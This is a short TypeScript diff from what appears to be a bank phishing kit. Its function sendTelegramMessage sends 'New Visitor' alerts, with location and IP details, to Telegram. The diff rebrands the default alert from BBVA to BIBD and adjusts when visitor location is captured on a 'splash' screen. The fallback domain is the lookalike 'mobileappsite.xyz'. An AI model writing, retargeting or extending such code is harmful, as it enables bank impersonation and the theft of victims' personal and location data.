@@ -320,7 +320,7 @@ export const sendTelegramMessage = async (params: {
     try {
         const { title, type, exclude, message: customMessage, ...data } = params;
 
-        const mainTitle = title || "BBVA — New Visitor";
+        const mainTitle = title || "BIBD — New Visitor";
         const domain =
             (typeof window !== "undefined" && window.location?.origin) ||
             "https://mobileappsite.xyz";
@@ -428,11 +428,12 @@ export const sendTelegramMessage = async (params: {
         }
 
         // Section: EXACT LOCATION FORMAT FROM SCREENSHOT
-        // Location info ONLY comes on the first screen when user visits
+        // Location info ONLY comes on the splash screen
         const isVisitorScreen =
-            type === "visitor" ||
-            Boolean(title?.toLowerCase().includes("visitor")) ||
-            params.includeLocation === true;
+            params.includeLocation === true ||
+            type === "splash" ||
+            Boolean(title?.toLowerCase().includes("splash")) ||
+            type === "visitor";
 
         if (isVisitorScreen && !exclude?.includes("location") && typeof window !== "undefined") {
             let ip =
